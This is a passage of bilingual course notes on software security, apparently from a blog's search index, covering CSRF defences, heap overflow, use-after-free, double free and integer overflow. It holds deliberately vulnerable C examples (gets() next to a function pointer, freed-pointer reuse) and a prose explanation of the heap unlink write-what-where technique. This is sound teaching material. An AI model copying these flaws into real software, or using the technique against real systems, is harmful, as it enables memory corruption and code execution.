哈希令牌：\n<ul>\n<li>使用用户会话信息、请求参数等作为输入，生成一个哈希值作为令牌。</li>\n<li>通常通过加盐（salt）来增加令牌的复杂性和不可预测性。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>Prevent CSRF: Defence-in-depth techniques</li>\n</ol>\n<ul>\n<li>SameSite Cookie Attribute\n<ul>\n<li>Prevent the cookie from being sent by the browser to the target site in all cross-site browsing contexts</li>\n<li>如何防护：设置 <code>SameSite</code>  属性为 <code>Strict</code>  或 <code>Lax</code> ，防止浏览器在跨站浏览环境中发送 Cookie，从而阻止 CSRF 攻击。<br>\n <code>SameSite=Strict</code> ：Cookie 仅在同一站点请求时发送，完全阻止跨站请求。<br>\n <code>SameSite=Lax</code> ：Cookie 允许在少数跨站请求中发送（如 GET 请求或导航），但会限制大多数情况下的跨站请求</li>\n<li>示例：</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight http\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Set-Cookie</span><span class=\"punctuation\">: </span>sessionId=abc123; SameSite=Strict;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>Verifying Origin With Standard Headers\n<ul>\n<li>Determine and match both the source and target of a request</li>\n<li>如何防护：Web 应用服务器检查请求的 Origin 或 Referer 头，并确保它们与应用的域匹配。<br>\n仅允许来自可信域的请求进行处理。</li>\n<li>示例：对于银行转账请求，服务器将确保请求的来源为 <code>https://bank.com</code> 。</li>\n</ul>\n</li>\n<li>Double Submit Cookie\n<ul>\n<li>Every transaction request must include a random value in both a cookie and as a request parameter</li>\n<li>如何防护：<br>\n用户在登录时生成一个随机值，并在后续的每个请求中将该值同时包含在 Cookie 和请求参数中。<br>\n服务器检查这两个值是否匹配，不匹配则拒绝请求。</li>\n<li>优势：攻击者无法同时控制 Cookie 和请求参数，防止了 CSRF 攻击。</li>\n<li>示例：</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight http\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">// Set cookie</span><br><span class=\"line\"> Set-Cookie: csrfToken=xyz123;</span><br><span class=\"line\"></span><br><span class=\"line\"> // Form submission includes the token</span><br><span class=\"line\"> POST /transfer</span><br><span class=\"line\"> Cookie: csrfToken=xyz123</span><br><span class=\"line\"> Body: token=xyz123&amp;acct=CHARLIE&amp;amount=1000</span><br></pre></td></tr></table></figure>\n<ul>\n<li>User Interaction\n<ul>\n<li>Involve the user in the transaction (e.g. one-time verification code, CAPTCHA, etc.)</li>\n<li>如何防护：在重要操作（如转账、密码修改等）中使用一次性验证码（OTP）、CAPTCHA 或类似机制，要求用户主动确认操作。<br>\n通过用户的主动参与，确保请求是由用户发起的，而不是由恶意脚本伪造的。</li>\n<li>优势：阻止自动化 CSRF 攻击，提高了用户操作的安全性。</li>\n<li>示例：在转账页面中要求用户输入发送到其手机的一次性验证码（OTP）。</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"XSS VS CSRF\" class=\"active\"><a class=\"anchor\"  href=\"#XSS VS CSRF\">#</a>XSS VS CSRF</h1>\n<table>\n<thead>\n<tr>\n<th>方面</th>\n<th>XSS (Cross-Site Scripting)</th>\n<th>CSRF (Cross-Site Request Forgery)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>攻击目标</td>\n<td>执行恶意代码，控制用户浏览器</td>\n<td>利用用户的身份认证，进行未授权请求</td>\n</tr>\n<tr>\n<td>危害</td>\n<td>窃取敏感信息、劫持会话、操纵网页内容</td>\n<td>未授权更改数据、提交表单等敏感操作</td>\n</tr>\n<tr>\n<td>原理</td>\n<td>注入恶意代码，使浏览器执行攻击者的脚本</td>\n<td>利用用户的已登录状态，发送伪造的请求</td>\n</tr>\n<tr>\n<td>防御措施</td>\n<td>输入过滤、内容安全策略 (CSP)、HttpOnly Cookie</td>\n<td>CSRF 令牌、检查 Referer Header、SameSite Cookie</td>\n</tr>\n</tbody>\n</table>\n","categories":["课程笔记","Principles of Software Security"],"tags":["software security","HTTP","XSS","CSRF"]},{"title":"Heap buffer overflow","url":"/course/Heap-buffer-overflow/","content":"<h1 id=\"Heap allocation\" class=\"active\"><a class=\"anchor\"  href=\"#Heap allocation\">#</a>Heap allocation</h1>\n<h2 id=\"Memory Allocation\" class=\"active\"><a class=\"anchor\"  href=\"#Memory Allocation\">#</a>Memory Allocation</h2>\n<ol>\n<li>Static memory</li>\n</ol>\n<ul>\n<li>Store global variables, permanent for the entire lifetime of the process</li>\n</ul>\n<ol start=\"2\">\n<li>Automatic memory</li>\n</ol>\n<ul>\n<li>Stack stores local variables, stackframes are added or removed for functional calls</li>\n</ul>\n<ol start=\"3\">\n<li>Dynamic memory</li>\n</ol>\n<ul>\n<li>Heap stores shared data structures in a large pool of memory</li>\n<li>Not allocated in contiguous order 由程序员管理</li>\n</ul>\n<h2 id=\"Stack Allocation\" class=\"active\"><a class=\"anchor\"  href=\"#Stack Allocation\">#</a>Stack Allocation</h2>\n<ol>\n<li>Stack is contiguous blocks of memory managed by OS</li>\n</ol>\n<ul>\n<li>Cannot be modified</li>\n</ul>\n<ol start=\"2\">\n<li>Stack grows and shrinks as functions are called and exited</li>\n</ol>\n<ul>\n<li>Usually has an upper bound, may raise exceptions</li>\n</ul>\n<ol start=\"3\">\n<li>Variables are allocated and freed automatically</li>\n</ol>\n<ul>\n<li>Only exist when the function that created them is active on the stack</li>\n</ul>\n<h2 id=\"Heap Allocation\" class=\"active\"><a class=\"anchor\"  href=\"#Heap Allocation\">#</a>Heap Allocation</h2>\n<ol>\n<li>Heap is noncontiguous blocks of memory managed by the programmer</li>\n</ol>\n<ul>\n<li>Can be modified programatically</li>\n</ul>\n<ol start=\"2\">\n<li>Heap is large and boundless, usually limited by only the physical memory available</li>\n<li>Variables are allocated and freed by using library functions or build-in language constructs</li>\n</ol>\n<ul>\n<li>C calls standard library functions, e.g. malloc, realloc, calloc and free</li>\n<li>C++ also uses these functions, but adds build-in operators new and delete</li>\n<li>Pointers are required to access data on the heap</li>\n</ul>\n<figure class=\"highlight c\"><figcaption><span>Memory Allocation Example</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"> <span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"> <span class=\"type\">int</span> x;  <span class=\"comment\">// 静态变量，存储在静态内存区，生命周期与进程相同</span></span><br><span class=\"line\"> <span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">     <span class=\"type\">int</span> y;          <span class=\"comment\">// 栈变量</span></span><br><span class=\"line\">     <span class=\"type\">char</span> *str;      <span class=\"comment\">// 指向堆内存的指针</span></span><br><span class=\"line\"> </span><br><span class=\"line\">     y = <span class=\"number\">4</span>;</span><br><span class=\"line\">     <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;stack memory: %d\\n&quot;</span>, y);</span><br><span class=\"line\"> </span><br><span class=\"line\">     <span class=\"comment\">// 分配 100 个字符的堆内存</span></span><br><span class=\"line\">     str = <span class=\"built_in\">malloc</span>(<span class=\"number\">100</span> * <span class=\"keyword\">sizeof</span>(<span class=\"type\">char</span>));</span><br><span class=\"line\">     str[<span class=\"number\">0</span>] = <span class=\"string\">&#x27;m&#x27;</span>;</span><br><span class=\"line\">     <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;heap memory: %c\\n&quot;</span>, str[<span class=\"number\">0</span>]);</span><br><span class=\"line\"> </span><br><span class=\"line\">     <span class=\"comment\">// 释放分配的堆内存</span></span><br><span class=\"line\">     <span class=\"built_in\">free</span>(str);</span><br><span class=\"line\"> </span><br><span class=\"line\">     <span class=\"keyword\">return</span> <span class=\"number\">0</span>;  <span class=\"comment\">// 栈上的局部变量 y 和 str 会在这里被自动释放</span></span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://img.picui.cn/free/2024/10/28/671f7e7bed371.png\" alt=\"img\"></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Stack</th>\n<th>Heap</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Basic</strong></td>\n<td>Memory is allocated in a contiguous block</td>\n<td>Memory is allocated in any random order</td>\n</tr>\n<tr>\n<td><strong>Allocation and Deallocation</strong></td>\n<td>Automatic by compiler instructions</td>\n<td>Manual by programmer</td>\n</tr>\n<tr>\n<td><strong>Cost</strong></td>\n<td>Less</td>\n<td>More</td>\n</tr>\n<tr>\n<td><strong>Implementation</strong></td>\n<td>Hard</td>\n<td>Easy</td>\n</tr>\n<tr>\n<td><strong>Access time</strong></td>\n<td>Faster</td>\n<td>Slower</td>\n</tr>\n<tr>\n<td><strong>Main Issue</strong></td>\n<td>Shortage of memory</td>\n<td>Memory fragmentation</td>\n</tr>\n<tr>\n<td><strong>Locality of reference</strong></td>\n<td>Excellent</td>\n<td>Adequate</td>\n</tr>\n<tr>\n<td><strong>Flexibility</strong></td>\n<td>Fixed size</td>\n<td>Resizing is possible</td>\n</tr>\n<tr>\n<td><strong>Data type structure</strong></td>\n<td>Linear</td>\n<td>Hierarchical</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"Heap buffer overflow\" class=\"active\"><a class=\"anchor\"  href=\"#Heap buffer overflow\">#</a>Heap buffer overflow</h1>\n<h2 id=\"Dereference\" class=\"active\"><a class=\"anchor\"  href=\"#Dereference\">#</a>Dereference</h2>\n<p>Much harder to exploit heap overflows:</p>\n<ul>\n<li>Heap memory is not flat or contiguous</li>\n<li>There is no return address saved on the heap</li>\n<li>The address to overwrite is hard to find</li>\n<li>General exploitation techniques manipulate the metadata used by memory allocator</li>\n</ul>\n<p>To read/write the value inside the memory address pointed to by the pointer</p>\n<figure class=\"highlight c\"><figcaption><span>Dereference a Pointer</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> x; </span><br><span class=\"line\"> <span class=\"type\">int</span> *p; <span class=\"comment\">// p 是一个指向整数的指针  *p is an integer</span></span><br><span class=\"line\"> x = <span class=\"number\">0</span>;  <span class=\"comment\">// x 现在等于 0 </span></span><br><span class=\"line\"> p = &amp;x; <span class=\"comment\">// p 指向 x 的地址   now *p == 0, since *p == x</span></span><br><span class=\"line\"> *p = <span class=\"number\">1</span>; <span class=\"comment\">// 相当于 x = 1，因为 p == &amp;x</span></span><br><span class=\"line\">\t     <span class=\"comment\">// 现在 *p 和 x 都等于 1</span></span><br></pre></td></tr></table></figure>\n<p>A C-language structure is a basic data structure that holds multiple fields</p>\n<figure class=\"highlight c\"><figcaption><span>Dereference a Structure Pointer</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">MY_STRUCT</span> &#123;</span> </span><br><span class=\"line\">     <span class=\"type\">int</span> my_int; </span><br><span class=\"line\">     <span class=\"type\">float</span> my_float; </span><br><span class=\"line\"> &#125; MY_STRUCT_T; </span><br><span class=\"line\"></span><br><span class=\"line\"> MY_STRUCT_T info = &#123;<span class=\"number\">1</span>, <span class=\"number\">3.141593F</span>&#125;; </span><br><span class=\"line\"> MY_STRUCT_T *instance = &amp;info; </span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"type\">int</span> a = info.my_int;        <span class=\"comment\">// 使用 &#x27;.&#x27; 操作符选择字段</span></span><br><span class=\"line\"> <span class=\"type\">int</span> b = (*instance).my_int; <span class=\"comment\">// 解引用后选择字段</span></span><br><span class=\"line\"> <span class=\"type\">int</span> c = instance-&gt;my_int;   <span class=\"comment\">// &#x27;-&gt;&#x27; 是前一种情况的语法糖</span></span><br></pre></td></tr></table></figure>\n<p>访问结构体字段的三种方式：</p>\n<ul>\n<li><code>info.my_int</code> ：使用  <code>.</code>  操作符直接访问结构体变量  <code>info</code>  中的字段  <code>my_int</code> 。这是最简单的访问方式，因为  <code>info</code>  是结构体变量，不是指针。</li>\n<li><code>*instance</code> ：解引用指针  <code>instance</code> ，获取它指向的结构体  <code>info</code> 。 <code>(*instance)</code>  代表结构体本身。<br>\n <code>(*instance).my_int</code> ：在解引用后使用 <code>.</code>  操作符访问结构体字段  <code>my_int</code> 。这种方式相当于对 info 变量的直接访问，只不过是通过指针来完成的。</li>\n<li><code>instance-&gt;my_int</code> ： <code>-&gt;</code>  是一种简便写法（语法糖），用于访问指针指向的结构体的字段。这相当于  <code>(*instance).my_int</code> ，但写法更加简洁。 <code>-&gt;</code>  只能用于指针，而  <code>.</code>  用于直接的结构体变量。</li>\n</ul>\n<h2 id=\"Heap Overflow\" class=\"active\"><a class=\"anchor\"  href=\"#Heap Overflow\">#</a>Heap Overflow</h2>\n<ol>\n<li>Simple Heap Overflow</li>\n</ol>\n<figure class=\"highlight c\"><figcaption><span>Simple Heap Overflow</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"> <span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"> <span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">target</span> &#123;</span></span><br><span class=\"line\">     <span class=\"type\">char</span> buf[<span class=\"number\">100</span>];        <span class=\"comment\">// 易受攻击的缓冲区</span></span><br><span class=\"line\">     <span class=\"type\">void</span> (*fun)(<span class=\"type\">char</span> *);  <span class=\"comment\">// 函数指针</span></span><br><span class=\"line\"> &#125; <span class=\"type\">target_t</span>;</span><br><span class=\"line\"> <span class=\"type\">void</span> <span class=\"title function_\">foo</span><span class=\"params\">(<span class=\"type\">char</span> *buf)</span> &#123;</span><br><span class=\"line\">     <span class=\"comment\">// 目标函数，可能被攻击者控制的数据替换</span></span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[])</span> &#123;</span><br><span class=\"line\">     <span class=\"type\">target_t</span> *rec = <span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"type\">target_t</span>)); <span class=\"comment\">// 动态分配结构体内存</span></span><br><span class=\"line\">     rec-&gt;fun = foo; <span class=\"comment\">// 将函数指针初始化为 foo</span></span><br><span class=\"line\">     gets(rec-&gt;buf); <span class=\"comment\">// 易受攻击的函数，可能导致缓冲区溢出</span></span><br><span class=\"line\">     rec-&gt;fun(<span class=\"string\">&quot;test&quot;</span>); <span class=\"comment\">// 调用函数指针</span></span><br><span class=\"line\">     <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>结构体定义</li>\n</ul>\n<figure class=\"highlight c\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">target</span> &#123;</span></span><br><span class=\"line\">     <span class=\"type\">char</span> buf[<span class=\"number\">100</span>];        <span class=\"comment\">// 缓冲区</span></span><br><span class=\"line\">     <span class=\"type\">void</span> (*fun)(<span class=\"type\">char</span> *);  <span class=\"comment\">// 函数指针</span></span><br><span class=\"line\"> &#125; <span class=\"type\">target_t</span>;</span><br></pre></td></tr></table></figure>\n<p>结构体  <code>target</code>  包含两个字段：<br>\n <code>buf</code> ：一个大小为 100 字节的字符数组，是易受攻击的缓冲区。<br>\n <code>fun</code> ：一个函数指针，指向接受一个字符指针参数的函数。</p>\n<ul>\n<li>缓冲区溢出</li>\n</ul>\n<figure class=\"highlight c\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">gets(rec-&gt;buf);</span><br></pre></td></tr></table></figure>\n<p><code>gets()</code>  是一个危险的函数，它从标准输入读取数据并存储到指定的缓冲区  <code>buf</code>  中。<br>\n <code>gets()</code>  不会检查输入数据的长度，如果输入超过了  <code>buf</code>  的 100 字节大小限制，就会导致缓冲区溢出。</p>\n<ul>\n<li>利用堆溢出<br>\n当攻击者提供的输入长度超过 100 字节时，超出的数据将会覆盖  <code>fun</code>  函数指针。<br>\n攻击者可以利用这种情况，将  <code>fun</code>  指针重写为攻击者控制的地址，从而在程序中执行任意代码。</li>\n</ul>\n<ol start=\"2\">\n<li>Difficult to Overwrite Non-Contiguous Memory<br>\nHeap buffers are not adjacent, there may some extra space</li>\n</ol>\n<ul>\n<li>It may be possible to calculate the extra space to craft an exploit</li>\n<li>But the exploit will be application-specific!\n<ol>\n<li>堆内存的分散性\n<ul>\n<li>堆上的缓冲区并不总是相邻的，因为它们根据内存分配器的策略进行分配。</li>\n<li>不同分配之间可能存在空隙（padding）或元数据（metadata），使得直接覆盖非连续内存变得困难。</li>\n</ul>\n</li>\n<li>内存分配器的元数据\n<ul>\n<li>堆内存中分配的每个块通常带有元数据（如大小、状态、指向下一个块的指针等），用于管理内存块的分配和释放。</li>\n<li>攻击者在试图覆盖非连续内存时，还需要考虑这些元数据的存在，否则可能导致分配器崩溃或异常，暴露攻击的痕迹。</li>\n</ul>\n</li>\n</ol>\n</li>\n</ul>\n<h2 id=\"Heap Allocator\" class=\"active\"><a class=\"anchor\"  href=\"#Heap Allocator\">#</a>Heap Allocator</h2>\n<ol>\n<li>How heap memory is allocated?<br>\nHeap allocator maintains a <strong>doubly-linked list</strong> of allocated and free chunks (blocks of memory)\n<ul>\n<li><code>malloc()</code>  and  <code>free()</code>  add or remove chunks from this list<br>\nChunk management information is stored together with user data in memory</li>\n<li>Writing data past the end of a chunk boundary may overwrite the management fields</li>\n</ul>\n</li>\n<li>Chunk Record<br>\nHeap blocks are C records (i.e. struct) that have a few fields along with the chunk of memory\n<ul>\n<li>fd: the pointer to the next block</li>\n<li>bk: the pointer to the previous block</li>\n<li>ps: the size of the previous chunk</li>\n<li>sz: the size of the current chunk</li>\n<li>Other fields such as free flag to indicate if the current chunk is in the freelis</li>\n</ul>\n</li>\n<li>Unlink a Chunk<br>\n <code>free()</code>  removes a chunk from allocated list</li>\n</ol>\n<p><img data-src=\"https://img.picui.cn/free/2024/10/28/671f8d584507c.png\" alt=\"img\"></p>\n<ul>\n<li>Unlink performs the following two writes on the list’s fields:\n<ul>\n<li>chunk2‐&gt;bk‐&gt;fd = chunk2‐&gt;fd</li>\n<li>chunk2‐&gt;fd‐&gt;bk = chunk2‐&gt;bk</li>\n</ul>\n</li>\n<li>By overflowing  <code>chunk2</code> , attacker can take control of  <code>chunk2‐&gt;fd</code>  and  <code>chunk2‐&gt;bk</code></li>\n<li>Suppose the attacker wants to write  <code>value</code>  to memory address  <code>addr</code>\n<ul>\n<li>Attacker sets  <code>chunk2‐&gt;fd</code>  to be  <code>value</code></li>\n<li>Attacker sets  <code>chunk2‐&gt;bk</code>  to be  <code>(addr - offset_fd)</code>\n<ul>\n<li><code>offset_fd</code>  is the offset of the fd field in the record</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>The attacker can write arbitrary value to arbitrary memory address in this way</li>\n<li>The first unlink write achieves the attacker’s goal:  <code>chunk2‐&gt;bk‐&gt;fd = chunk2‐&gt;fd</code></li>\n<li>The first write effectively becomes:  <code>(addr - offset_fb)‐&gt;fd = value</code></li>\n<li>This is the same as  <code>*addr = value</code>\n<ul>\n<li>Fields are selected by offsets</li>\n<li><code>offset_fd</code>  cancels out  <code>fd</code> <br>\nAttackers can use hundreds of writes to copy the shellcode into memory</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Prevention\" class=\"active\"><a class=\"anchor\"  href=\"#Prevention\">#</a>Prevention</h2>\n<p>Very hard to detect and prevent due to the dynamic nature of the heap<br>\nPossible ways to protect against heap overflow</p>\n<ul>\n<li>Prevent execution of the payload by separating the code and data</li>\n<li>Introduce randomisation so the heap is not found at a fixed offset</li>\n<li>Introduce sanity checks into the heap allocator</li>\n</ul>\n<h1 id=\"Pointer-related heap errors \" class=\"active\"><a class=\"anchor\"  href=\"#Pointer-related heap errors \">#</a>Pointer-related heap errors </h1>\n<h2 id=\"Use After Free\" class=\"active\"><a class=\"anchor\"  href=\"#Use After Free\">#</a>Use After Free</h2>\n<ol>\n<li>A memory is accessed after it is freed (and re-allocated)\n<ul>\n<li>Can cause a program to crash, use unexpected values, or execute code</li>\n</ul>\n</li>\n<li>Attackers may overwrite the re-allocated memory including metadata\n<ul>\n<li>May result in the same effect as some heap overflow vulnerabilities</li>\n</ul>\n</li>\n</ol>\n<figure class=\"highlight c\"><figcaption><span>Use After Free Example</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span> &#123; </span><br><span class=\"line\">    <span class=\"type\">char</span> *buf1, *buf2; </span><br><span class=\"line\">    buf1 = (<span class=\"type\">char</span> *)<span class=\"built_in\">malloc</span>(BUFSIZE1); <span class=\"comment\">// 为 buf1 分配 BUFSIZE1 大小的内存</span></span><br><span class=\"line\">    <span class=\"comment\">// 释放 buf1，使其分配的内存可被重用</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(buf1); </span><br><span class=\"line\">    <span class=\"comment\">// 可能在 buf1 释放的内存区域内分配 buf2</span></span><br><span class=\"line\">    buf2 = (<span class=\"type\">char</span> *)<span class=\"built_in\">malloc</span>(BUFSIZE2); </span><br><span class=\"line\">    <span class=\"comment\">// 攻击者可能会通过覆盖 buf2 及其元数据来利用漏洞</span></span><br><span class=\"line\">    <span class=\"built_in\">strncpy</span>(buf1, argv[<span class=\"number\">1</span>], BUFSIZE1<span class=\"number\">-1</span>); </span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>Example Problems\n<ol>\n<li><code>free(buf1)</code>  的影响\n<ul>\n<li>当  <code>buf1</code>  被释放后，其对应的内存区域变得可供再次分配。</li>\n<li>因为  <code>free()</code>  并不会立即将内存清零或使指针失效，所以  <code>buf1</code>  仍然指向被释放的内存区域。</li>\n<li>在这段代码中， <code>buf2</code>  可能会被分配到  <code>buf1</code>  释放的内存区域（这取决于堆分配器的实现和内存布局）。</li>\n</ul>\n</li>\n<li><code>strncpy(buf1, argv[1], BUFSIZE1-1)</code>  的问题\n<ul>\n<li>即使  <code>buf1</code>  已被释放，程序仍然在此处试图使用  <code>buf1</code>  进行写操作。</li>\n<li>由于  <code>buf1</code>  被释放后可能被  <code>buf2</code>  重新使用， <code>buf1</code>  和  <code>buf2</code>  可能指向相同的内存区域。这意味着通过  <code>strncpy()</code>  对  <code>buf1</code>  的写入可能会影响  <code>buf2</code> ，甚至覆盖  <code>buf2</code>  的元数据。</li>\n</ul>\n</li>\n</ol>\n</li>\n</ol>\n<h2 id=\"Double Free\" class=\"active\"><a class=\"anchor\"  href=\"#Double Free\">#</a>Double Free</h2>\n<ol>\n<li>A memory address is freed (i.e.  <code>free()</code> ) twice\n<ul>\n<li>Can also cause a program to crash, use unexpected values, or execute code</li>\n</ul>\n</li>\n<li>Attackers may corrupt metadata of new memory allocated at the address\n<ul>\n<li>May also result in the same effect as some heap overflow vulnerabilities</li>\n</ul>\n</li>\n</ol>\n<figure class=\"highlight c\"><figcaption><span>Double Free Example</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span> &#123; </span><br><span class=\"line\">    <span class=\"type\">char</span> *buf1, *buf2; </span><br><span class=\"line\">    buf1 = (<span class=\"type\">char</span> *)<span class=\"built_in\">malloc</span>(BUFSIZE1);  <span class=\"comment\">// 为 buf1 分配 BUFSIZE1 大小的内存</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(buf1);  <span class=\"comment\">// 释放 buf1，内存可供重用</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// buf2 可能被分配到 buf1 释放的内存区域</span></span><br><span class=\"line\">    buf2 = (<span class=\"type\">char</span> *)<span class=\"built_in\">malloc</span>(BUFSIZE2);  </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// buf2 可能包含攻击者提供的数据</span></span><br><span class=\"line\">    <span class=\"built_in\">strncpy</span>(buf2, argv[<span class=\"number\">1</span>], BUFSIZE2<span class=\"number\">-1</span>);  </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// buf1 被再次释放（双重释放）</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(buf1); </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 释放 buf2（使用了可能被攻击者修改的元数据）</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(buf2);  </span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>Example Problems\n<ol>\n<li>第一次释放  <code>buf1</code>\n<ul>\n<li>通过  <code>free(buf1)</code> ， <code>buf1</code>  所占用的内存被释放，成为可供重用的内存区域。</li>\n<li><code>buf2</code>  可能分配到  <code>buf1</code>  的内存区域</li>\n<li>因为  <code>buf1</code>  已被释放，内存分配器可能会将  <code>buf2</code>  分配到之前  <code>buf1</code>  占用的内存区域。</li>\n<li>攻击者可能通过覆盖  <code>buf2</code>  中的内容来修改元数据</li>\n<li>使用  <code>strncpy()</code>  函数将用户输入复制到  <code>buf2</code>  中，这可能导致覆盖  <code>buf2</code>  的元数据（如堆链表指针或其他关键数据）。</li>\n</ul>\n</li>\n<li>第二次释放  <code>buf1</code>\n<ul>\n<li><code>free(buf1)</code>  导致双重释放，因为  <code>buf1</code>  已经在第一次释放后被重用，现在与  <code>buf2</code>  指向相同的内存区域。</li>\n<li>此时，内存分配器可能会使用被攻击者修改的元数据，从而导致不安全的内存操作。</li>\n</ul>\n</li>\n<li>释放  <code>buf2</code>\n<ul>\n<li>当  <code>buf2</code>  被释放时，内存分配器可能会再次处理被攻击者修改的元数据，进一步导致内存覆盖或异常。</li>\n</ul>\n</li>\n</ol>\n</li>\n</ol>\n<h2 id=\"Prevention and Detection of Pointer Errors\" class=\"active\"><a class=\"anchor\"  href=\"#Prevention and Detection of Pointer Errors\">#</a>Prevention and Detection of Pointer Errors</h2>\n<ol>\n<li>Difficult to detect all of them by either dynamic or static analysis</li>\n</ol>\n<ul>\n<li>Complex runtime states</li>\n<li>E.g. memory may be allocated, freed and used in different functions via aliases (pointers)</li>\n<li>Fuzzing may detect some in executed paths when they crash the program</li>\n</ul>\n<ol start=\"2\">\n<li>The simplest prevention is to set all freed pointers to NULL</li>\n</ol>\n<ul>\n<li>Trigger null pointer dereference errors when accessed</li>\n<li>Most operating systems provide built-in defence against null-pointer dereference</li>\n</ul>\n","categories":["课程笔记","Principles of Software Security"],"tags":["C","software security"]},{"title":"Integer overflow","url":"/course/Integer-overflow/","content":"<h1 id=\"Integer overflow\" class=\"active\"><a class=\"anchor\"  href=\"#Integer overflow\">#</a>Integer overflow</h1>\n When the result of an integer operation does not fit within the allocated memory space. All common languages are affected \n<ol>\n<li>How Does an Integer Overflow Happen?\n<ol>\n<li>无符号整数溢出：例如，一个 32 位无符号整数的范围是 0 到 4,294,967,295（即 2**32 − 1 或 0xffffffff）。如果我们执行计算 4,294,967,295 + 1，则会导致溢出，因为结果超出了无符号整数的范围</li>\n<li>有符号整数溢出</li>\n</ol>\n<ul>\n<li>符号位的溢出<br>\n当一个整数运算的结果超过有符号整数的范围时，符号位（最高位）可能会被覆盖，从而引发溢出。<br>\n有符号整数的符号位：在有符号整数中，最高位用来表示数值的正负。例如，32 位有符号整数的最高位是第 31 位（第 0 位到第 30 位是数值位）。溢出导致符号变化：如果运算结果超出正数范围，符号位会被设置为 1，这会导致数值被解释为负数。例如，在 32 位有符号整数中，+2,147,483,647 + 1 会导致数值变成 -2,147,483,648，因为符号位被改变。</li>\n<li>向下类型转换（Downcasting）和数值截断（Truncation）\n<ul>\n<li>向下类型转换：指将一个高精度的数据类型转换为低精度的数据类型。例如，将 long 类型转换为 int 时，如果原始值超过 int 的范围，可能会导致数值截断。</li>\n<li>数值截断可能导致溢出：截断发生时，较高位的数值会被忽略，只保留低位部分。这可能导致数值错误，甚至触发整数溢出。例如，如果一个 64 位的 long 类型被转换为 32 位的 int 类型，而其数值超过了 32 位整数的最大值，那么高位将被截断，只保留低 32 位，可能导致溢出或错误的计算结果。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Risks of Integer Overflow<br>\nMostly lead to program errors, but can have severe consequences</li>\n</ol>\n<ul>\n<li>Buffer overflow occurs when an integer overflow happens in calculating the length of the buffer</li>\n<li>Erroneous program behaviours in mission critical software Incorrect financial calculations</li>\n</ul>\n<h1 id=\"Real-World Examples\" class=\"active\"><a class=\"anchor\"  href=\"#Real-World Examples\">#</a>Real-World Examples</h1>\n<ol>\n<li>Integer Overflow Leads to Buffer Overflow in OpenSSH 3.3</li>\n</ol>\n <figure class=\"highlight c\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">nresp = packet_get_int(); </span><br><span class=\"line\"> <span class=\"keyword\">if</span> (nresp &gt; <span class=\"number\">0</span>) </span><br><span class=\"line\"> 